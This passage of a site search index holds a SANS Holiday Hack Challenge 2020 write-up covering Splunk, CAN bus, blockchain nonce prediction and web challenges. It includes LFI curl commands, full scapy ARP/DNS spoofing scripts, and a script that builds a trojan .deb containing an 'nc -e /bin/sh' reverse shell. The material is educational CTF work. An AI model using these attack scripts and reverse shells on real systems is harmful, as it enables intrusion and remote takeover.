55FCEEBB21270D9249E86F4B9DC7AA60"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_10","text":"Looking at ALL the technique indices (index=t* ) with source as the zeek x509 logs specifically win-dc: index=t* *cert* source=\"/opt/zeek/logs/current/x509.log\" certificate.subject=*win-dc* | table certificate.serial, certificate.subject | dedup certificate.serial, certificate.subject","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#the-splunk-challenge-question","text":"What is the name of the adversary group that Santa feared would attack KringleCon?","title":"The Splunk challenge question :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-the-lollipop-guild","text":"","title":"Answer : The Lollipop Guild"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_11","text":"","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#gather-all-the-hints","text":"Alice gave a few hints: Hint 1: Alice says the \"ciphertext is 7FXjP1lyfKbyDK/MChyf36h7\" Hint 2: Alice says \"We don't care about RFC 7465\" RFC 7465 requires that the TLC clients and servers never negotiate the user of RC4 ciphers when they establish connections. https://tools.ietf.org/html/rfc7465 So, if they don\u2019t care about RFC 7465, they ignore that RC4 should not be used and still used RC4 ciphers. This means the encryption method used was RC4. But encryption needs a key. What that key would be? Hint 3 Alice says the last one is encrypted using \"your favorite phrase\" Santa asks \"my favorite phrase?\" Alice says \"I can\u2019t believe the Splunk folks put it in their talk\" now, we go and watch the below talk which is in Kringlecon 2020: Dave Herrald, Adversary Emulation and Automation | KringleCon 2020 Mr. Dave Herrald has the below in the video: and he says, this is the most important slide you want to take note of if you are preparing for the Splunk challenge within holiday hack challenge 2020: Stay Frosty (That might be our encryption key)","title":"Gather all the hints!"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#find-answer-using-all-the-hints","text":"So, far we have below hints: a) We have the base64 text 7FXjP1lyfKbyDK/MChyf36h7 b) We know RC4 could potentially be the encryption method c) We know \u201cStay Frosty\u201d could potentially be the encryption keys used in RC4 Now we use all the hints to find out the adversary The Lollipop Guild Open Cyberchef https://gchq.github.io/CyberChef/ Build the receipe : 1st item: \"From Base64\" input: 7FXjP1lyfKbyDK/MChyf36h7 2nd Item: \"Encryption /Encoding\" > RC4 Passphrase: Stay Frosty Answer : The Lollipop Guild","title":"Find answer using all the hints:"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#can-bus-problem","text":"","title":"CAN Bus Problem"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-122520","text":"","title":"Answer : 122520"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_12","text":"When you open the UI, you will see many messages. Filter out the noise with those all 0's in the message in the Sleigh CAN-D bus. When you click unlock, there is one message which consistently comes up : 19B#00000F000000 Filter out the other one 19B#0000000F2057. Now, we have consistently 19B#00000F000000 when we click unlock. Criteria added to filter noise and message for unlock found Now in the CAN-Bus Investigation terminal, grep for \u201c19B#00000F000000\" in the canndump.log and you see the entry 1608926671.122520. This challenge needed the decimal portion of the timestamp and hence the answer is 122520. Please see the below screenshot. Find the CAN id# in the candump.log ; Get the decimal portion of the mssage Id (the answer)","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-7-solve-the-sleighs-can-d-bus-problem","text":"Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.","title":"Objective 7: Solve the Sleigh's CAN-D-BUS Problem"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_13","text":"Wunorse Openslae says there is an issue with breaks and doors : Hints from Wunrose Openslae CAN ID of doors is 19B CAN ID of breaks is 080 \"Breaks\" fix - Exclude all the messages containing FF (larger numbers, greater than decimal 100) \"Doors\" fix - Exclude the malicious messages 0F2057","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-8-broken-tag-generator","text":"Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.","title":"Objective 8: Broken Tag Generator"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-jackfrostwashere","text":"","title":"Answer : JackFrostWasHere"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#high-level-approach","text":"Exploit the directory traversal vulnerability in the tag generator application to use the Local File Inclusion (LFI) on the web server running the application and then access the /proc/self/environ which will contain the all the environment variable used by the web server process including the variable named \u201cGREETZ\u201d","title":"High level Approach:"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_14","text":"","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#check-if-the-web-app-has-directory-traversal-vulnerability","text":"The elf Holly Evergreen thinks there may be an issue with the \"file upload\" feature : Hints from Holly Evergreen When you upload an image in the tag generator, the image is stored with below URL. https://tag-generator.kringlecastle.com/image?id= .png [Please click on the image below to see enlarged image] https://tag-generator.kringlecastle.com/image?id= .png When you upload a non-image file, it gives a below error. From the error, we understand the below: It\u2019s a Ruby on Rails app the app.rb resides in /app/lib app.rb stores the user uploaded files in /tmp Error when you upload an image file Assuming whatever is being uploaded in /temp is being evaluated without any validation, if we can try directory traversal to get the code of app.rb curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb ../app/lib/app.rb This means, from the current directory /tmp, go one level up (means root), then app, then lib and then can get app.rb Now we have the source code of the app.rb :","title":"Check if the web app has directory traversal vulnerability"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#use-the-local-file-inclusion-lsi-to-access-the-environment-variables-of-the-process","text":"So, we know this Ruby application has the directory traversal vulnerability curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb Under Linux, /proc/self is a dynamic symlink that the kernel provides that points to the process opening it. e.g., if process 1234 tries to follow /proc/self, it will be looking the same content as /proc/1234 and then proc/self/environ will have all the environment variables for the process. curl https://tag-generator.kringlecastle.com/image?id=../proc/self/environ | tr '\\0' '\\n' This will list all the environment variables including \u201cGREETZ\u201d value of which would be \u201c JackFrostWasHere \u201d","title":"Use the Local File Inclusion (LSI) to access the environment variables of the process"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-9-arp-shenanigans","text":"Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?","title":"Objective 9: ARP Shenanigans"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-tanta-kringle","text":"","title":"Answer : Tanta Kringle"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#high-level-approach_1","text":"Change the ARP cache of target machine (10.6.6.35) so all requests come to our host (ARP Poisoning) and we respond to DNS requests (DNS poisoning). Build a Linux trojan on a deb file (which 10.6.6.35 is constantly requesting). This Linux trojan when executed on 10.6.6.35 will open a reverse shell of 10.6.6.35 on our host. With shell access on the 10.6.6.35, we get access to the file /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt which will have the name who recused herself from the vote described on the document. Below screenshot shows how we determined the machines. Nslookup provides more information on those 3 hosts.","title":"High level approach :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#the-process","text":"","title":"The Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#arp-poisoning","text":"Spoof the ARP response going to 10.6.6.35 with our MAC address so all requests (including DNS requests) from 10.6.6.35 come to our host (ARP Poisoning). Change the /script/arp_resp.py accordingly.","title":"ARP Poisoning:"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#dns-poisoning","text":"Since we can intercept all the DNS requests coming from 10.6.6.35, we can respond to those DNS responses (DNS poisoning). Change the /script/dns_resp.py accordingly.","title":"DNS Poisoning :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#create-a-linux-trojan-with-netcat-reverse-shell-payload-for-port-4444-in-it","text":"10.6.6.35 requests for a specific DEB file (pub/jfrost/backdoor/suriv_amd64.deb) over HTTP. We can create a Linux trojan with any DEB file renamed as above deb file which will include a netcat reverse shell. The Linux trojan will be placed in the same directory structure as requested by 10.6.6.35 [pub/jfrost/backdoor/suriv_amd64.deb]","title":"Create a Linux trojan with netcat reverse shell payload for port 4444 in it"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#run-python-web-server-and-netcat-listening-on-port-4444","text":"Run the python web server on the root. Run netcat listening on our host on port 4444. Showing ARP Poisoning","title":"Run Python web server and netcat listening on port 4444"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#changes-to-the-scriptarp_resppy","text":"Changes to scripts/arp_resp.py","title":"Changes to the script/arp_resp.py :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#dns-poisoning-diagram","text":"Please click on the image to see the enlarged view : DNS poisoning","title":"DNS Poisoning diagram :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#changes-to-scriptsdns_resppy","text":"Changes to scripts/dns_resp.py","title":"Changes to scripts/dns_resp.py"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#creating-the-linux-trojan","text":"The debs/ folder has a number of deb files. We choose netcat-traditional_1.10-41.1ubuntu1_amd64.deb Add netcat reverse shell script to this deb file : nc 10.6.0.3 4444 -e /bin/sh Above will executed when the deb file is requested and executed on 10.6.6.35. This will give a reverse shell on 10.6.6.35 to out host 10.6.0.3 on 4444. Ref : http://www.wannescolman.be/?p=98","title":"Creating the linux trojan :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#putting-it-all-together","text":"See the below screenshot the processes executed in the below order \u2013 numbered in the below screenshot.","title":"Putting it all together :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#0-netcat-nlvp-4444","text":"1 : tcpdump -i eth0 -w dump2.pcap 2 : python3 -m http.server 80 3 : python3 scripts/dns_resp.py 4 : python3 scripts/arp_resp.py 5 : We get reverse shell on 10.6.6.35 Once we get the reverse shell on 10.6.0.3, we can get the file NORTH_POLE_Land_Use_Board_Meeting_Minutes and found who recused hersef from vote. It was Tara Kringle !","title":"0 : netcat -nlvp 4444"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#all-script-files-in-the-zip-file-please-remove-the-txt-from-files-after-extraction","text":"all_changed_scripts Download","title":"All Script files in the zip file (please remove the .txt from files after extraction):"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#arp_resppy-with-changes-for-arp-poisoning","text":"","title":"arp_resp.py (with changes) for ARP poisoning"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#usrbinpython3","text":"from scapy.all import * import netifaces as ni import uuid","title":"!/usr/bin/python3"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#our-eth0-ip","text":"ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']","title":"Our eth0 ip"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#our-eth0-mac-address","text":"macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1]) def handle_arp_packets(packet): # if arp request, then we need to fill this out to send back our mac as the response if ARP in packet and packet[ARP].op == 1: ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr) arp_response = ARP(pdst=packet[Ether].psrc) arp_response.op = 'is-at' arp_response.plen = 4 arp_response.hwlen = 6 arp_response.ptype = 0x800 arp_response.hwtype = 0x1 arp_response.hwsrc = macaddr arp_response.psrc = packet[ARP].pdst arp_response.hwdst = packet[ARP].hwsrc arp_response.pdst = packet[ARP].psrc response = ether_resp/arp_response sendp(response, iface=\"eth0\") def main(): # We only want arp requests berkeley_packet_filter = \"(arp[6:2] = 1)\" # sniffing for one packet that will be sent to a function, while storing none sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1) if __name__ == \"__main__\": main()","title":"Our eth0 mac address"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#dns_resp-with-changes-for-dns-poisoning","text":"","title":"dns_resp (with changes) for DNS poisoning :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#usrbinpython3_1","text":"from scapy.all import * import netifaces as ni import uuid","title":"!/usr/bin/python3"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#our-eth0-ip_1","text":"ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']","title":"Our eth0 IP"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#our-mac-addr","text":"macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])","title":"Our Mac Addr"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#destination-ip-we-arp-spoofed","text":"ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request(packet): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether(src=packet.dst, dst=packet.src) ip = IP(dst=packet[IP].src, src=packet[IP].dst) udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) dns = DNS( # MISSING DNS RESPONSE LAYER VALUES id=packet[DNS].id, qr=1, ancount=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr) ) dns_response = eth / ip / udp / dns sendp(dns_response, iface=\"eth0\") def main(): berkeley_packet_filter = \" and \".join( [ \"udp dst port 53\", # dns \"udp[10] & 0x80 = 0\", # dns request \"dst host {}\".format(ipaddr_we_arp_spoofed), # destination ip we had spoofed (not our real ip) \"ether dst host {}\".format(macaddr) # our macaddress since we spoofed the ip to our mac ] ) # sniff the eth0 int without storing packets in memory and stopping after one dns request sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface=\"eth0\", count=1) if __name__ == \"__main__\": main()","title":"destination ip we arp spoofed"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#build_linux_trojansh-to-create-a-linux-trojan-with-a-deb-file","text":"","title":"build_linux_trojan.sh [to create a Linux trojan with a .deb file]"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#binbash","text":"cd ~/ mkdir build-payload cp debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb build-payload/ cd build-payload mkdir work echo \"Extracting netcat-traditional_1.10-41.1ubuntu1_amd64.deb to work/ folder\" dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work mkdir work/DEBIAN ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb echo \"Extracting the control and postinst file from netcat-traditional_1.10-41.1ubuntu1_amd64.deb and \" tar -xf control.tar.xz ./control tar -xf control.tar.xz ./postinst echo \"stuffing nc 10.6.6.53 4444 -e /bin/sh to the postinst file\" echo \"nc 10.6.0.3 4444 -e /bin/sh\" >> postinst # thats my IP address which I want 10.6.6.35 to connect to get the reverse shell on this host mv control work/DEBIAN/ mv postinst work/DEBIAN/ cd ~/ echo \"buiding the deb package\" dpkg-deb --build build-payload/work/ cd ~/ mkdir -p pub/jfrost/backdoor echo \"moving the work.deb to pub/jfrost/backdoor/suriv_amd64.deb\" mv build-payload/work.deb pub/jfrost/backdoor/suriv_amd64.deb echo \"pub/jfrost/backdoor/suriv_amd64.deb is ready!\"","title":"!/bin/bash"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-10-defeat-fingerprint-sensor","text":"Bypass the Santavator fingerprint sensor. Enter Santa\u2019s office without Santa\u2019s fingerprint.","title":"Objective 10: Defeat Fingerprint Sensor"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#high-level-details","text":"When you click the elevator panel, a special JavaScript file named \u201capp.js\u201d get loaded which checks for a flag named \u201cbesanta\u201d for successful scan of the fingerprint. We host that \"app.js\" file in our local with the \"besanta\" check removed and then load that file using Fiddler instead of server app.js. With \"besanta\" check removed, you bypass the fingerprint check.","title":"High level details :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_15","text":"Below actions are as me (not Santa). If you right click on the Scan Fingerprint and \"Inspect\" User Chrome's inspect to look at the javascript behind the \"Scan fingerprint\" image You will see the that fingerprint image is actually a DIV with class name \"print-cover\" with click action handler of which is in app.js. View source showing the click handler will execute a function in https://elevator.kringlecastle.com/app.js Now look at the event handler in the app.js. In addition to the powered, it checks if the token named \" besanta \". If It\u2019s there, it will allow to go to Santa's office. If not, it will play error sound. Click handler of \"Scan fingerprint\" image Now, what we can do is to make a copy of this app.js, remove that && hasToken('besanta') condition. Then host that in local IIS server (like http://localhost/app.js ) Check for \"besanta\" removed in local app.js Open Fiddler and apply filter for app.js so when you click on the scan fingerprint image only that URL gets captured. https://elevator.kringlecastle.com/app.js Traffic to https://elevator.kringlecatsle.com/app.js is captured. Filter applied Filter to \"show if URL contains\" Filter value \"app.js\" Save the contents of https://elevator.kringlecastle.com/app.js to a file named app.js and py the file in local IIS server e.g. c:\\inetpub\\wwwroot so the file could be accessble on https://localhost/app.js See the below screenshot (steps are numbered): Go to Fiddler > AutoResponder (1) > Enable Rules (2) > Add Rule (3) > Add https://localhost/app.js (4) > Save (5) This will replace the has Token app.js file from sever https://elevator.kringlecastle.com/app.js (with 'besanta' check) Now when you click on the fingerprint scanner, you will be able to get into Santa's office.","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-11a-naughtynice-list-with-blockchain-investigation-part-1","text":"Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)","title":"Objective 11a): Naughty/Nice List with Blockchain Investigation Part 1"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-57066318f32f729d","text":"","title":"Answer : 57066318F32F729D"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#high-level-approach_2","text":"In Santa's office, Tinsel Upatree has the Blockchain.dat and the zip file containing the python script The naughty_nice.py verifies the block chain up to block# 129996. So, we have nonce up to 12996. If we get the last 624 nonces with last one being of block# 12996, we can use the MT19937Predictor to get the nonce of 12997, 12998, 12999 and finally 13000 which is needed by this objective.","title":"High-level approach :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#details","text":"The zip file named OfficialNaughtyNiceBlockchainEducationPack.zip has following contents. We put the Blockchain.dat to examine it using the naughty_nice.py Contents of \"OfficialNaughtyNiceBlockchainEducationPack.zip\" The naughty_nice.py was changed to get all the last 624 nonces of the blockchain. Then those last 624 nonces were fed into the MT19937Predictor() to get nonce for block# 12997 The nonce of 12997 was included in the list to get the nonce for block# 12998. The nonce of 12998 was included in the list to get the nonce for block# 12999. The nonce of 12999 was included in the list to get the nonce for block# 13000. For changes in the naughty_nice.py, compare the naughty_nice_original.py and naughty_nice.py. Changes in \"naughty_nice.py\" Running naughty_nice.py. The nonce for block#13000 is 6270808489970332317 Converting to hexadecimal It would be 57066318F32F729D and that\u2019s the answer. Convering decimal to hex","title":"Details :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#the-below-zip-file-contains-the-changed-naughty_nicepy-please-remove-the-txt-after-extraction","text":"naughty_nice.py Download","title":"The below zip file contains the changed naughty_nice.py (please remove the .txt after extraction)"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#naughty_nicepy","text":"#!/usr/bin/env python3 ''' So, you want to work with the naughty/nice blockchain? Welcome! This python module is your first step in that process. It will introduce you to how the Naughty/Nice blockchain is structured and how we at the North Pole use blockchain technology. The North Pole has been using blockchain technology since Santa first invented it back in the 1960's. (Jolly prankster that he is, Santa posted a white paper on the Internet that he wrote under a pseudonym describing a non-Naughty/Nice application of blockchains a dozen or so years back. It caused quite a stir...) Important note: This module will NOT allow you to add content to the Official Naughty/Nice Blockchain! That can only be done through the Official Naughty/Nice Website, which passes new blocks to the Official Santa Signature System (OS3) that applies a digital signature to the content of each block before it is added to the chain. Only blocks whose contents have been digitally signed by that system are placed on the Naughty/Nice blockchain. Note: If you're authorized to use the Official Naughty/Nice website, you will have been given a login and password for that site after completing your training as a part of Elf University's \"Assessing and Evaluating Human Behavior for Naughty/Niceness\" Curriculum. This code is used to introduce how blocks/chains are created and allow you to view and/or validate portions (or the entirety) of the Official Naughty/Nice Blockchain. A blockchain, while a part of the whole cryptocurrency \"fad\" that a certain pseudonym-packing North Pole resident appears to have begun, are certainly not limited to that use. A blockchain can be used anywhere that a record of information or transactions need to be maintained in a way that cannot be altered. And really, what information is more important (and necessarily unalterable) than acts of Naughty/Niceness? A blockchain works by linking each record together with the previous record. Each block's data contains a cryptographic hash of the previous block's data. Because a block cannot be altered without altering the cryptographic hash of its contents, any alteration of the data within a block will be immediately evident, because every following block will no longer be valid. In addition to this built-in property of a blockchain, the Official Naughty/Nice Blockchain has a few other safeguards. The cryptographic hash of each block is signed using the Official Santa Signature System (OS3). Currently, the Official Naughty/Nice Blockchain uses MD5 as its hashing algorithm, but plans are in place to move to SHA256 in 2021. This update is part of a phased process to modernize the blockchain code. In 2019, the entire blockchain system was ported from the original COBOL code to Python3. Because of concerns about hash collisions in MD5, in the new Python3 code, a 64-bit random \"nonce\" was added to the beginning of each block at the time of creation. This module represents a portion of the most current blockchain codebase. It consists of two classes, one for the creation of blocks, called Block(), and one for the creation, examination, and verification of chains of blocks, called Chain(). The following is an overview of the functionality provided by these classes: The Chain() class is where most blockchain work is performed. It is designed to be as \"block-agnostic\" as possible, so it can be used with blocks that hold different types of data. To use a different type of block, you simply replace (or subclass) the Block() class. For this to work, there are several functions that MUST be supplied by the Block() class. Let's take a look at those. The Block() class MUST supply the following functions, used by the Chain() class: create\\_genesis\\_block() - This creates a very special block used at the beginning of the blockchain, and known as the \"genesis\" block. Because it has no previous block to reference it is, by definition, always considered valid. This block uses an agreed-upon, fake previous hash value. verify\\_types() - Because the Chain() class is block-agnostic, it needs the Block() class to validate that a block contains valid data. This function returns True or False. block\\_data() - a function that returns a representation of all of the data in the block that is to be hashed and signed. The data is returned as a Python3 bytes object. full\\_block\\_data() - a function that returns a representation of the entire block, including any hashes and signatures. A hash of this data is what is used as the \"previous hash\" value in the subsequent block. This data is returned as a Python3 bytes object. This function is also used when saving either the entire blockchain to a file, or a single block to a file load\\_a\\_block(\\[filehandle\\]) - this function takes a filehandle and returns a block at a time for addition to the block chain. This function DOES NOT verify blocks. This function throws a Value\\_Error exception when it either encounters the end of the file or unparsable data. The Naughty/Nice Block() class also defines a utility function: dump\\_doc(\\[document number\\]) - this will dump the indicated supporting document to a file named as <block\\_index>.<data\\_type\\_extension>. Note: this function will overwrite any existing file with that name, so if there are multiple documents (there can be up to 9) of the same type affixed to a record, it is the responsibility of the calling process to rename them as appropriate. The Chain() class provides the following functions: add\\_block(\\[block\\_data\\]) - passes a block\\_data dictionary to the Block() initialization code. This function, being \"block-agnostic\" simply passes the block\\_data along. It is up to the Block() initialization code to validate this data. verify\\_chain(\\[public\\_key\\], <beginning hash>) - steps through every block in the chain and verifies that the data in each block is of the correct type, that the block index is correct, that the block contains the correct hash for the previous block, and that the block signature is a valid signature based on the hash of the block data. It then hashes the full block for use as the \"previous hash\" on the next block. This returns True or False. (If False, it prints information about what, specific, issues were found and the block that triggered the issue.) Note: If you're working with a portion of the block chain that does not begin with a genesis block, you'll need to provide a value for the previous block's hash for this function to work. save\\_a\\_block(index, <filename>) - saves the block at index to the filename provided, or to \"block.dat\" if no filename is given. save\\_chain(<filename>) - saves the chain to the filename provided, or to \"blockchain.dat\" if no filename is given. load\\_chain(<filename>) - loads a chain from the filename provided, or from \"blockchain.dat\" if no filename is given. This returns the count of blocks loaded. This DOES NOT verify that the data loaded is a valid blockchain. It is recommended to call verify\\_chain() immediately after loading a new chain. An overview of how we process the Official Naughty/Nice Blockchain: There are approximately 7.8 billion people and magical beings on Earth, and each one is tracked 24 hours a day throughout the year by a fleet of Elves-On-The-Shelves. While those elves are clearly visible during the Holiday season, don't be fooled into believing that we're only tracking Naughty/Niceness at that time. On average, each of the billions of subjects that we monitor are performing some sort of Naughty or Nice activity that rises to the level of being scored on the blockchain around 2.1 times per week. Keeping track of all of that activity on a single blockchain would be incredibly processing intensive (that would be ~1^12 blocks/year, or 32,000 blocks/second), so we've broken our record-keeping into 1,000 different blockchains. If you do the math, you'll find that each of the blockchains is now responsible for between 1,500 and 2000 blocks per minute, which is a reasonable load. A separate database keeps track of which Personal ID (pid) is assigned to each of the blockchains. Throughout the year, we periodically run each of the chains to determine who is the best (and worst) of our subjects. While only the final Holiday run is used to determine who is getting something good in their stockings and who is getting a lump of coal, it's always interesting to see a listing of the Nicest and Naughtiest folks out there. Please note: Wagering on the results of the Official Naughty/Nice Blockchain is STRICTLY PROHIBITED. If you intend to use your access to the Official Naughty/Nice Blockchain code to facilitate any sort of gambling, you will be racking up a whole bunch of Naughtiness points. YOU HAVE BEEN WARNED! (I'm looking at you, Alabaster Snowball...) For this reason, we have not provided any code that will perform a computation of Naughty/Nice points. Additionally, for privacy reasons, there is also no code to pull the records associated with specific individuals from this list. While the creation of that code would not be difficult, you are honor-bound to use your access to this list for only good and noble purposes. Signing Keys - Information We have provided you with an example private key that you can use when generating your own blockchains for test purposes. This private key (which also contains the public key information) is called private.pem. Additionally, we have provided you with a copy of the public key used to verify the Official Naughty/Nice Blockchain. This is the public key component of the private key used by the Official Santa Signature System (OS3) to sign blocks on the Official Naughty/Nice Blockchain. This key is contained in the file official\\_public.pem. ''' import random from Crypto.Hash import MD5, SHA256 from Crypto.PublicKey import RSA from Crypto.Signature import PKCS1\\_v1\\_5 from base64 import b64encode, b64decode import binascii import time import itertools from mt19937predictor import MT19937Predictor genesis\\_block\\_fake\\_hash = '00000000000000000000000000000000' data\\_types = {1:'plaintext', 2:'jpeg image', 3:'bmp image', 4:'gif image', 5:'PDF', 6:'Word', 7:'PowerPoint', 8:'Excel', 9:'tiff image', 10:'MP4 video', 11:'MOV video', 12:'WMV video', 13:'FLV video', 14:'AVI video', 255:'Binary blob'} data\\_extension = {1:'txt', 2:'jpg', 3:'bmp', 4:'gif', 5:'pdf', 6:'docx', 7:'pptx', 8:'xlsx', 9:'tiff', 10:'mp4', 11:'mov', 12:'wmv', 13:'flv', 14:'avi', 255:'bin'} Naughty = 0 Nice = 1 class Block(): def \\_\\_init\\_\\_(self, index=None, block\\_data=None, previous\\_hash=None, load=False, genesis=False): if(genesis == True): return None else: self.data = \\[\\] if(load == False): if all(p is not None for p in \\[index, block\\_data\\['documents'\\], block\\_data\\['pid'\\], block\\_data\\['rid'\\], block\\_data\\['score'\\], block\\_data\\['sign'\\], previous\\_hash\\]): self.index = index if self.index == 0: self.nonce = 0 # genesis block else: self.nonce = random.randrange(0xFFFFFFFFFFFFFFFF) self.data = block\\_data\\['documents'\\] self.previous\\_hash = previous\\_hash self.doc\\_count = len(self.data) self.pid = block\\_data\\['pid'\\] self.rid = block\\_data\\['rid'\\] self.score = block\\_data\\['score'\\] self.sign = block\\_data\\['sign'\\] now = time.gmtime() self.month = now.tm\\_mon self.day = now.tm\\_mday self.hour = now.tm\\_hour self.minute = now.tm\\_min self.second = now.tm\\_sec self.hash, self.sig = self.hash\\_n\\_sign() else: return None def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def \\_\\_repr\\_\\_(self): s = 'Chain Index: %i\\\\n' % (self.index) s += ' Nonce: %s\\\\n' % ('%016.016x' % (self.nonce)) s += ' PID: %s\\\\n' % ('%016.016x' % (self.pid)) s += ' RID: %s\\\\n' % ('%016.016x' % (self.rid)) s += ' Document Count: %1.1i\\\\n' % (self.doc\\_count) s += ' Score: %s\\\\n' % ('%08.08x (%i)' % (self.score, self.score)) n\\_n = 'Naughty' if self.sign > 0: n\\_n = 'Nice' s += ' Sign: %1.1i (%s)\\\\n' % (self.sign, n\\_n) c = 1 for d in self.data: s += ' Data item: %i\\\\n' % (c) s += ' Data Type: %s (%s)\\\\n' % ('%02.02x' % (d\\['type'\\]), data\\_types\\[d\\['type'\\]\\]) s += ' Data Length: %s\\\\n' % ('%08.08x' % 